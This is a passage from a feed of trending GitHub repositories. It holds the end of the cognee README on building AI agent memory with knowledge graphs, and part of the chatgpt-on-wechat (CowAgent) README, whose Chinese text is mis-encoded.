 &lt;p&gt;&lt;a href="https://GitHub.com/topoteretes/cognee/network/"&gt;&lt;img src="https://img.shields.io/github/forks/topoteretes/cognee.svg?style=social&amp;amp;label=Fork&amp;amp;maxAge=2592000" alt="GitHub forks" /&gt;&lt;/a&gt; &lt;a href="https://GitHub.com/topoteretes/cognee/stargazers/"&gt;&lt;img src="https://img.shields.io/github/stars/topoteretes/cognee.svg?style=social&amp;amp;label=Star&amp;amp;maxAge=2592000" alt="GitHub stars" /&gt;&lt;/a&gt; &lt;a href="https://GitHub.com/topoteretes/cognee/commit/"&gt;&lt;img src="https://badgen.net/github/commits/topoteretes/cognee" alt="GitHub commits" /&gt;&lt;/a&gt; &lt;a href="https://github.com/topoteretes/cognee/tags/"&gt;&lt;img src="https://badgen.net/github/tag/topoteretes/cognee" alt="GitHub tag" /&gt;&lt;/a&gt; &lt;a href="https://pepy.tech/project/cognee"&gt;&lt;img src="https://static.pepy.tech/badge/cognee" alt="Downloads" /&gt;&lt;/a&gt; &lt;a href="https://github.com/topoteretes/cognee/raw/main/LICENSE"&gt;&lt;img src="https://img.shields.io/github/license/topoteretes/cognee?colorA=00C586&amp;amp;colorB=000000" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://github.com/topoteretes/cognee/graphs/contributors"&gt;&lt;img src="https://img.shields.io/github/contributors/topoteretes/cognee?colorA=00C586&amp;amp;colorB=000000" alt="Contributors" /&gt;&lt;/a&gt; &lt;a href="https://github.com/sponsors/topoteretes"&gt;&lt;img src="https://img.shields.io/badge/Sponsor-‚ù§Ô∏è-ff69b4.svg" alt="Sponsor" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt; &lt;a href="https://www.producthunt.com/posts/cognee?embed=true&amp;amp;utm_source=badge-top-post-badge&amp;amp;utm_medium=badge&amp;amp;utm_souce=badge-cognee" target="_blank" style="display:inline-block; margin-right:10px;"&gt; &lt;img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=946346&amp;amp;theme=light&amp;amp;period=daily&amp;amp;t=1744472480704" alt="cognee - Memory for AI Agents  in 5 lines of code | Product Hunt" width="250" height="54" /&gt; &lt;/a&gt; &lt;a href="https://trendshift.io/repositories/13955" target="_blank" style="display:inline-block;"&gt; &lt;img src="https://trendshift.io/api/badge/repositories/13955" alt="topoteretes%2Fcognee | Trendshift" width="250" height="55" /&gt; &lt;/a&gt; &lt;/p&gt; 
 &lt;p&gt;Use your data to build personalized and dynamic memory for AI Agents. Cognee lets you replace RAG with scalable and modular ECL (Extract, Cognify, Load) pipelines.&lt;/p&gt; 
 &lt;p align="center"&gt; üåê Available Languages : 
  &lt;!-- Keep these links. Translations will automatically update with the README. --&gt; &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=de"&gt;Deutsch&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=es"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=fr"&gt;Fran√ßais&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=ja"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/topoteretes/cognee/main/README_ko.md"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=pt"&gt;Portugu√™s&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=ru"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | &lt;a href="https://www.readme-i18n.com/topoteretes/cognee?lang=zh"&gt;‰∏≠Êñá&lt;/a&gt; &lt;/p&gt; 
 &lt;div style="text-align: center"&gt; 
  &lt;img src="https://raw.githubusercontent.com/topoteretes/cognee/refs/heads/main/assets/cognee_benefits.png" alt="Why cognee?" width="50%" /&gt; 
 &lt;/div&gt; 
&lt;/div&gt; 
&lt;h2&gt;About Cognee&lt;/h2&gt; 
&lt;p&gt;Cognee is an open-source tool and platform that transforms your raw data into persistent and dynamic AI memory for Agents. It combines vector search with graph databases to make your documents both searchable by meaning and connected by relationships. Cognee offers default memory creation and search which we describe bellow. But with Cognee you can build your own!&lt;/p&gt; 
&lt;p&gt;&lt;span&gt;‚≠ê&lt;/span&gt; &lt;em&gt;Help us reach more developers and grow the cognee community. Star this repo!&lt;/em&gt;&lt;/p&gt; 
&lt;h3&gt;Cognee Open Source:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Interconnects any type of data ‚Äî including past conversations, files, images, and audio transcriptions&lt;/li&gt; 
 &lt;li&gt;Replaces traditional RAG systems with a unified memory layer built on graphs and vectors&lt;/li&gt; 
 &lt;li&gt;Reduces developer effort and infrastructure cost while improving quality and precision&lt;/li&gt; 
 &lt;li&gt;Provides Pythonic data pipelines for ingestion from 30+ data sources&lt;/li&gt; 
 &lt;li&gt;Offers high customizability through user-defined tasks, modular pipelines, and built-in search endpoints&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Basic Usage &amp;amp; Feature Guide&lt;/h2&gt; 
&lt;p&gt;To learn more, &lt;a href="https://colab.research.google.com/drive/12Vi9zID-M3fpKpKiaqDBvkk98ElkRPWy?usp=sharing"&gt;check out this short, end-to-end Colab walkthrough&lt;/a&gt; of Cognee's core features.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://colab.research.google.com/drive/12Vi9zID-M3fpKpKiaqDBvkk98ElkRPWy?usp=sharing"&gt;&lt;img src="https://colab.research.google.com/assets/colab-badge.svg?sanitize=true" alt="Open In Colab" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Quickstart&lt;/h2&gt; 
&lt;p&gt;Let‚Äôs try Cognee in just a few lines of code. For detailed setup and configuration, see the &lt;a href="https://docs.cognee.ai/getting-started/installation#environment-configuration"&gt;Cognee Docs&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Prerequisites&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Python 3.10 to 3.13&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Step 1: Install Cognee&lt;/h3&gt; 
&lt;p&gt;You can install Cognee with &lt;strong&gt;pip&lt;/strong&gt;, &lt;strong&gt;poetry&lt;/strong&gt;, &lt;strong&gt;uv&lt;/strong&gt;, or your preferred Python package manager.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;uv pip install cognee
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Step 2: Configure the LLM&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import os
os.environ["LLM_API_KEY"] = "YOUR OPENAI_API_KEY"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Alternatively, create a &lt;code&gt;.env&lt;/code&gt; file using our &lt;a href="https://github.com/topoteretes/cognee/raw/main/.env.template"&gt;template&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To integrate other LLM providers, see our &lt;a href="https://docs.cognee.ai/setup-configuration/llm-providers"&gt;LLM Provider Documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Step 3: Run the Pipeline&lt;/h3&gt; 
&lt;p&gt;Cognee will take your documents, generate a knowledge graph from them and then query the graph based on combined relationships.&lt;/p&gt; 
&lt;p&gt;Now, run a minimal pipeline:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;import cognee
import asyncio
from pprint import pprint


async def main():
    # Add text to cognee
    await cognee.add("Cognee turns documents into AI memory.")

    # Generate the knowledge graph
    await cognee.cognify()

    # Add memory algorithms to the graph
    await cognee.memify()

    # Query the knowledge graph
    results = await cognee.search("What does Cognee do?")

    # Display the results
    for result in results:
        pprint(result)


if __name__ == '__main__':
    asyncio.run(main())

&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;As you can see, the output is generated from the document we previously stored in Cognee:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;  Cognee turns documents into AI memory.
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Use the Cognee CLI&lt;/h3&gt; 
&lt;p&gt;As an alternative, you can get started with these essential commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cognee-cli add "Cognee turns documents into AI memory."

cognee-cli cognify

cognee-cli search "What does Cognee do?"
cognee-cli delete --all

&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To open the local UI, run:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cognee-cli -ui
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Demos &amp;amp; Examples&lt;/h2&gt; 
&lt;p&gt;See Cognee in action:&lt;/p&gt; 
&lt;h3&gt;Persistent Agent Memory&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/e113b628-7212-4a2b-b288-0be39a93a1c3"&gt;Cognee Memory for LangGraph Agents&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Simple GraphRAG&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/f2186b2e-305a-42b0-9c2d-9f4473f15df8"&gt;Watch Demo&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Cognee with Ollama&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/39672858-f774-4136-b957-1e2de67b8981"&gt;Watch Demo&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Community &amp;amp; Support&lt;/h2&gt; 
&lt;h3&gt;Contributing&lt;/h3&gt; 
&lt;p&gt;We welcome contributions from the community! Your input helps make Cognee better for everyone. See &lt;a href="https://raw.githubusercontent.com/topoteretes/cognee/main/CONTRIBUTING.md"&gt;&lt;code&gt;CONTRIBUTING.md&lt;/code&gt;&lt;/a&gt; to get started.&lt;/p&gt; 
&lt;h3&gt;Code of Conduct&lt;/h3&gt; 
&lt;p&gt;We're committed to fostering an inclusive and respectful community. Read our &lt;a href="https://github.com/topoteretes/cognee/raw/main/CODE_OF_CONDUCT.md"&gt;Code of Conduct&lt;/a&gt; for guidelines.&lt;/p&gt; 
&lt;h2&gt;Research &amp;amp; Citation&lt;/h2&gt; 
&lt;p&gt;We recently published a research paper on optimizing knowledge graphs for LLM reasoning:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{markovic2025optimizinginterfaceknowledgegraphs,
      title={Optimizing the Interface Between Knowledge Graphs and LLMs for Complex Reasoning},
      author={Vasilije Markovic and Lazar Obradovic and Laszlo Hajdu and Jovan Pavlovic},
      year={2025},
      eprint={2505.24478},
      archivePrefix={arXiv},
      primaryClass={cs.AI},
      url={https://arxiv.org/abs/2505.24478},
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>zhayujie/chatgpt-on-wechat</title>
      <link>https://github.com/zhayujie/chatgpt-on-wechat</link>
      <description>&lt;p&gt;CowAgentÊòØÂü∫‰∫éÂ§ßÊ®°ÂûãÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºåËÉΩ‰∏ªÂä®ÊÄùËÄÉÂíå‰ªªÂä°ËßÑÂàí„ÄÅËÆøÈóÆÊìç‰ΩúÁ≥ªÁªüÂíåÂ§ñÈÉ®ËµÑÊ∫ê„ÄÅÂàõÈÄ†ÂíåÊâßË°åSkills„ÄÅÊã•ÊúâÈïøÊúüËÆ∞ÂøÜÂπ∂‰∏çÊñ≠ÊàêÈïø„ÄÇÂêåÊó∂ÊîØÊåÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅÁΩëÈ°µÁ≠âÊé•ÂÖ•ÔºåÂèØÈÄâÊã©OpenAI/Claude/Gemini/DeepSeek/ Qwen/GLM/Kimi/LinkAIÔºåËÉΩÂ§ÑÁêÜÊñáÊú¨„ÄÅËØ≠Èü≥„ÄÅÂõæÁâáÂíåÊñá‰ª∂ÔºåÂèØÂø´ÈÄüÊê≠Âª∫‰∏™‰∫∫AIÂä©ÊâãÂíå‰ºÅ‰∏öÊï∞Â≠óÂëòÂ∑•„ÄÇ&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt;&lt;img src="https://github.com/user-attachments/assets/eca9a9ec-8534-4615-9e0f-96c5ac1d10a3" alt="Chatgpt-on-Wechat" width="550" /&gt;&lt;/p&gt; 
&lt;p align="center"&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/latest"&gt;&lt;img src="https://img.shields.io/github/v/release/zhayujie/chatgpt-on-wechat" alt="Latest release" /&gt;&lt;/a&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/LICENSE"&gt;&lt;img src="https://img.shields.io/github/license/zhayujie/chatgpt-on-wechat" alt="License: MIT" /&gt;&lt;/a&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat"&gt;&lt;img src="https://img.shields.io/github/stars/zhayujie/chatgpt-on-wechat?style=flat-square" alt="Stars" /&gt;&lt;/a&gt; &lt;br /&gt; &lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;CowAgent&lt;/strong&gt; ÊòØÂü∫‰∫éÂ§ßÊ®°ÂûãÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºåËÉΩÂ§ü‰∏ªÂä®ÊÄùËÄÉÂíå‰ªªÂä°ËßÑÂàí„ÄÅÊìç‰ΩúËÆ°ÁÆóÊú∫ÂíåÂ§ñÈÉ®ËµÑÊ∫ê„ÄÅÂàõÈÄ†ÂíåÊâßË°åSkills„ÄÅÊã•ÊúâÈïøÊúüËÆ∞ÂøÜÂπ∂‰∏çÊñ≠ÊàêÈïø„ÄÇCowAgent ÊîØÊåÅÁÅµÊ¥ªÂàáÊç¢Â§öÁßçÊ®°ÂûãÔºåËÉΩÂ§ÑÁêÜÊñáÊú¨„ÄÅËØ≠Èü≥„ÄÅÂõæÁâá„ÄÅÊñá‰ª∂Á≠âÂ§öÊ®°ÊÄÅÊ∂àÊÅØÔºåÂèØÊé•ÂÖ•ÁΩëÈ°µ„ÄÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑‰∏≠‰ΩøÁî®Ôºå7*24Â∞èÊó∂ËøêË°å‰∫é‰Ω†ÁöÑ‰∏™‰∫∫ÁîµËÑëÊàñÊúçÂä°Âô®‰∏≠„ÄÇ&lt;/p&gt; 
&lt;p&gt;üìñËÉΩÂäõ‰ªãÁªçÔºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/agent.md"&gt;CowAgent 2.0&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;ÁÆÄ‰ªã&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;ËØ•È°πÁõÆÊó¢ÊòØ‰∏Ä‰∏™ÂèØ‰ª•ÂºÄÁÆ±Âç≥Áî®ÁöÑË∂ÖÁ∫ßAIÂä©ÁêÜÔºå‰πüÊòØ‰∏Ä‰∏™ÊîØÊåÅÈ´òÊâ©Â±ïÁöÑAgentÊ°ÜÊû∂ÔºåÂèØ‰ª•ÈÄöËøá‰∏∫È°πÁõÆÊâ©Â±ïÂ§ßÊ®°ÂûãÊé•Âè£„ÄÅÊé•ÂÖ•Ê∏†ÈÅì„ÄÅÂÜÖÁΩÆÂ∑•ÂÖ∑„ÄÅSkillsÁ≥ªÁªüÊù•ÁÅµÊ¥ªÂÆûÁé∞ÂêÑÁßçÂÆöÂà∂ÈúÄÊ±Ç„ÄÇÊ†∏ÂøÉËÉΩÂäõÂ¶Ç‰∏ãÔºö&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§çÊùÇ‰ªªÂä°ËßÑÂàí&lt;/strong&gt;ÔºöËÉΩÂ§üÁêÜËß£Â§çÊùÇ‰ªªÂä°Âπ∂Ëá™‰∏ªËßÑÂàíÊâßË°åÔºåÊåÅÁª≠ÊÄùËÄÉÂíåË∞ÉÁî®Â∑•ÂÖ∑Áõ¥Âà∞ÂÆåÊàêÁõÆÊ†áÔºåÊîØÊåÅÈÄöËøáÂ∑•ÂÖ∑Êìç‰ΩúËÆøÈóÆÊñá‰ª∂„ÄÅÁªàÁ´Ø„ÄÅÊµèËßàÂô®„ÄÅÂÆöÊó∂‰ªªÂä°Á≠âÁ≥ªÁªüËµÑÊ∫ê&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;ÈïøÊúüËÆ∞ÂøÜÔºö&lt;/strong&gt; Ëá™Âä®Â∞ÜÂØπËØùËÆ∞ÂøÜÊåÅ‰πÖÂåñËá≥Êú¨Âú∞Êñá‰ª∂ÂíåÊï∞ÊçÆÂ∫ì‰∏≠ÔºåÂåÖÊã¨ÂÖ®Â±ÄËÆ∞ÂøÜÂíåÂ§©Á∫ßËÆ∞ÂøÜÔºåÊîØÊåÅÂÖ≥ÈîÆËØçÂèäÂêëÈáèÊ£ÄÁ¥¢&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;ÊäÄËÉΩÁ≥ªÁªüÔºö&lt;/strong&gt; ÂÆûÁé∞‰∫ÜSkillsÂàõÂª∫ÂíåËøêË°åÁöÑÂºïÊìéÔºåÂÜÖÁΩÆÂ§öÁßçÊäÄËÉΩÔºåÂπ∂ÊîØÊåÅÈÄöËøáËá™ÁÑ∂ËØ≠Ë®ÄÂØπËØùÂÆåÊàêËá™ÂÆö‰πâSkillsÂºÄÂèë&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÊ®°ÊÄÅÊ∂àÊÅØÔºö&lt;/strong&gt; ÊîØÊåÅÂØπÊñáÊú¨„ÄÅÂõæÁâá„ÄÅËØ≠Èü≥„ÄÅÊñá‰ª∂Á≠âÂ§öÁ±ªÂûãÊ∂àÊÅØËøõË°åËß£Êûê„ÄÅÂ§ÑÁêÜ„ÄÅÁîüÊàê„ÄÅÂèëÈÄÅÁ≠âÊìç‰Ωú&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÊ®°ÂûãÊé•ÂÖ•Ôºö&lt;/strong&gt; ÊîØÊåÅOpenAI, Claude, Gemini, DeepSeek, MiniMax„ÄÅGLM„ÄÅQwen„ÄÅKimiÁ≠âÂõΩÂÜÖÂ§ñ‰∏ªÊµÅÊ®°ÂûãÂéÇÂïÜ&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Â§öÁ´ØÈÉ®ÁΩ≤Ôºö&lt;/strong&gt; ÊîØÊåÅËøêË°åÂú®Êú¨Âú∞ËÆ°ÁÆóÊú∫ÊàñÊúçÂä°Âô®ÔºåÂèØÈõÜÊàêÂà∞ÁΩëÈ°µ„ÄÅÈ£û‰π¶„ÄÅÈíâÈíâ„ÄÅÂæÆ‰ø°ÂÖ¨‰ºóÂè∑„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°Â∫îÁî®‰∏≠‰ΩøÁî®&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Áü•ËØÜÂ∫ìÔºö&lt;/strong&gt; ÈõÜÊàê‰ºÅ‰∏öÁü•ËØÜÂ∫ìËÉΩÂäõÔºåËÆ©AgentÊàê‰∏∫‰∏ìÂ±ûÊï∞Â≠óÂëòÂ∑•ÔºåÂü∫‰∫é&lt;a href="https://link-ai.tech"&gt;LinkAI&lt;/a&gt;Âπ≥Âè∞ÂÆûÁé∞&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Â£∞Êòé&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Êú¨È°πÁõÆÈÅµÂæ™ &lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/LICENSE"&gt;MITÂºÄÊ∫êÂçèËÆÆ&lt;/a&gt;Ôºå‰∏ªË¶ÅÁî®‰∫éÊäÄÊúØÁ†îÁ©∂ÂíåÂ≠¶‰π†Ôºå‰ΩøÁî®Êú¨È°πÁõÆÊó∂ÈúÄÈÅµÂÆàÊâÄÂú®Âú∞Ê≥ïÂæãÊ≥ïËßÑ„ÄÅÁõ∏ÂÖ≥ÊîøÁ≠ñ‰ª•Âèä‰ºÅ‰∏öÁ´†Á®ãÔºåÁ¶ÅÊ≠¢Áî®‰∫é‰ªª‰ΩïËøùÊ≥ïÊàñ‰æµÁäØ‰ªñ‰∫∫ÊùÉÁõäÁöÑË°å‰∏∫„ÄÇ‰ªª‰Ωï‰∏™‰∫∫„ÄÅÂõ¢ÈòüÂíå‰ºÅ‰∏öÔºåÊó†ËÆ∫‰ª•‰ΩïÁßçÊñπÂºè‰ΩøÁî®ËØ•È°πÁõÆ„ÄÅÂØπ‰ΩïÂØπË±°Êèê‰æõÊúçÂä°ÔºåÊâÄ‰∫ßÁîüÁöÑ‰∏ÄÂàáÂêéÊûúÔºåÊú¨È°πÁõÆÂùá‰∏çÊâøÊãÖ‰ªª‰ΩïË¥£‰ªª&lt;/li&gt; 
 &lt;li&gt;ÊàêÊú¨‰∏éÂÆâÂÖ®ÔºöAgentÊ®°Âºè‰∏ãToken‰ΩøÁî®ÈáèÈ´ò‰∫éÊôÆÈÄöÂØπËØùÊ®°ÂºèÔºåËØ∑Ê†πÊçÆÊïàÊûúÂèäÊàêÊú¨ÁªºÂêàÈÄâÊã©Ê®°Âûã„ÄÇAgentÂÖ∑ÊúâËÆøÈóÆÊâÄÂú®Êìç‰ΩúÁ≥ªÁªüÁöÑËÉΩÂäõÔºåËØ∑Ë∞®ÊÖéÈÄâÊã©È°πÁõÆÈÉ®ÁΩ≤ÁéØÂ¢É„ÄÇÂêåÊó∂È°πÁõÆ‰πü‰ºöÊåÅÁª≠ÂçáÁ∫ßÂÆâÂÖ®Êú∫Âà∂„ÄÅÂπ∂Èôç‰ΩéÊ®°ÂûãÊ∂àËÄóÊàêÊú¨&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;ÊºîÁ§∫&lt;/h2&gt; 
&lt;p&gt;‰ΩøÁî®ËØ¥Êòé(AgentÊ®°Âºè)Ôºö&lt;a href="https://raw.githubusercontent.com/zhayujie/chatgpt-on-wechat/master/docs/agent.md"&gt;CowAgent‰ªãÁªç&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;DEMOËßÜÈ¢ë(ÂØπËØùÊ®°Âºè)Ôºö&lt;a href="https://cdn.link-ai.tech/doc/cow_demo.mp4"&gt;https://cdn.link-ai.tech/doc/cow_demo.mp4&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Á§æÂå∫&lt;/h2&gt; 
&lt;p&gt;Ê∑ªÂä†Â∞èÂä©ÊâãÂæÆ‰ø°Âä†ÂÖ•ÂºÄÊ∫êÈ°πÁõÆ‰∫§ÊµÅÁæ§Ôºö&lt;/p&gt; 
&lt;img width="140" src="https://img-1317903499.cos.ap-guangzhou.myqcloud.com/docs/open-community.png" /&gt; 
&lt;br /&gt; 
&lt;h1&gt;‰ºÅ‰∏öÊúçÂä°&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://link-ai.tech" target="_blank"&gt;&lt;img width="720" src="https://cdn.link-ai.tech/image/link-ai-intro.jpg" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;a href="https://link-ai.tech/"&gt;LinkAI&lt;/a&gt; ÊòØÈù¢Âêë‰ºÅ‰∏öÂíåÂºÄÂèëËÄÖÁöÑ‰∏ÄÁ´ôÂºèAIÊô∫ËÉΩ‰ΩìÂπ≥Âè∞ÔºåËÅöÂêàÂ§öÊ®°ÊÄÅÂ§ßÊ®°Âûã„ÄÅÁü•ËØÜÂ∫ì„ÄÅAgent Êèí‰ª∂„ÄÅÂ∑•‰ΩúÊµÅÁ≠âËÉΩÂäõÔºåÊîØÊåÅ‰∏ÄÈîÆÊé•ÂÖ•‰∏ªÊµÅÂπ≥Âè∞Âπ∂ËøõË°åÁÆ°ÁêÜÔºåÊîØÊåÅSaaS„ÄÅÁßÅÊúâÂåñÈÉ®ÁΩ≤Á≠âÂ§öÁßçÊ®°Âºè„ÄÇ&lt;/p&gt; 
 &lt;p&gt;LinkAI ÁõÆÂâçÂ∑≤Âú®Êô∫ËÉΩÂÆ¢Êúç„ÄÅÁßÅÂüüËøêËê•„ÄÅ‰ºÅ‰∏öÊïàÁéáÂä©ÊâãÁ≠âÂú∫ÊôØÁßØÁ¥Ø‰∫Ü‰∏∞ÂØåÁöÑAIËß£ÂÜ≥ÊñπÊ°àÔºåÂú®Ê∂àË¥π„ÄÅÂÅ•Â∫∑„ÄÅÊñáÊïô„ÄÅÁßëÊäÄÂà∂ÈÄ†Á≠âÂêÑË°å‰∏öÊ≤âÊ∑Ä‰∫ÜÂ§ßÊ®°ÂûãËêΩÂú∞Â∫îÁî®ÁöÑÊúÄ‰Ω≥ÂÆûË∑µÔºåËá¥Âäõ‰∫éÂ∏ÆÂä©Êõ¥Â§ö‰ºÅ‰∏öÂíåÂºÄÂèëËÄÖÊã•Êä± AI Áîü‰∫ßÂäõ„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;‰∫ßÂìÅÂí®ËØ¢Âíå‰ºÅ‰∏öÊúçÂä°&lt;/strong&gt; ÂèØËÅîÁ≥ª‰∫ßÂìÅÂÆ¢ÊúçÔºö&lt;/p&gt; 
&lt;img width="150" src="https://cdn.link-ai.tech/portal/linkai-customer-service.png" /&gt; 
&lt;br /&gt; 
&lt;h1&gt;üè∑ Êõ¥Êñ∞Êó•Âøó&lt;/h1&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2026.02.03Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/2.0.0"&gt;2.0.0ÁâàÊú¨&lt;/a&gt;ÔºåÊ≠£ÂºèÂçáÁ∫ß‰∏∫Ë∂ÖÁ∫ßAgentÂä©ÁêÜÔºåÊîØÊåÅÂ§öËΩÆ‰ªªÂä°ÂÜ≥Á≠ñ„ÄÅÂÖ∑Â§áÈïøÊúüËÆ∞ÂøÜ„ÄÅÂÆûÁé∞Â§öÁßçÁ≥ªÁªüÂ∑•ÂÖ∑„ÄÅÊîØÊåÅSkillsÊ°ÜÊû∂ÔºåÊñ∞Â¢ûÂ§öÁßçÊ®°ÂûãÂπ∂‰ºòÂåñ‰∫ÜÊé•ÂÖ•Ê∏†ÈÅì„ÄÇ&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2025.05.23Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.6"&gt;1.7.6ÁâàÊú¨&lt;/a&gt; ‰ºòÂåñwebÁΩëÈ°µchannel„ÄÅÊñ∞Â¢û &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/raw/master/plugins/agent/README.md"&gt;AgentMesh&lt;/a&gt;Â§öÊô∫ËÉΩ‰ΩìÊèí‰ª∂„ÄÅÁôæÂ∫¶ËØ≠Èü≥ÂêàÊàê‰ºòÂåñ„ÄÅ‰ºÅÂæÆÂ∫îÁî®&lt;code&gt;access_token&lt;/code&gt;Ëé∑Âèñ‰ºòÂåñ„ÄÅÊîØÊåÅ&lt;code&gt;claude-4-sonnet&lt;/code&gt;Âíå&lt;code&gt;claude-4-opus&lt;/code&gt;Ê®°Âûã&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2025.04.11Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.5"&gt;1.7.5ÁâàÊú¨&lt;/a&gt; Êñ∞Â¢ûÊîØÊåÅ &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/pull/2562"&gt;wechatferry&lt;/a&gt; ÂçèËÆÆ„ÄÅÊñ∞Â¢û deepseek Ê®°Âûã„ÄÅÊñ∞Â¢ûÊîØÊåÅËÖæËÆØ‰∫ëËØ≠Èü≥ËÉΩÂäõ„ÄÅÊñ∞Â¢ûÊîØÊåÅ ModelScope Âíå Gitee-AI APIÊé•Âè£&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;2024.12.13Ôºö&lt;/strong&gt; &lt;a href="https://github.com/zhayujie/chatgpt-on-wechat/releases/tag/1.7.4"&gt;1.7.4ÁâàÊú¨&lt;/a&gt; Êñ∞Â¢û Gemini 2.0 Ê®°Âûã„ÄÅÊñ∞Â¢ûweb channel„ÄÅËß£ÂÜ≥ÂÜÖÂ≠òÊ≥ÑÊºèÈóÆÈ¢ò„ÄÅËß£ÂÜ≥ &lt;code&gt;#reloadp&lt;/code&gt; ÂëΩ‰ª§ÈáçËΩΩ‰∏çÁîüÊïàÈóÆÈ¢ò&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;blockquote&gt; 
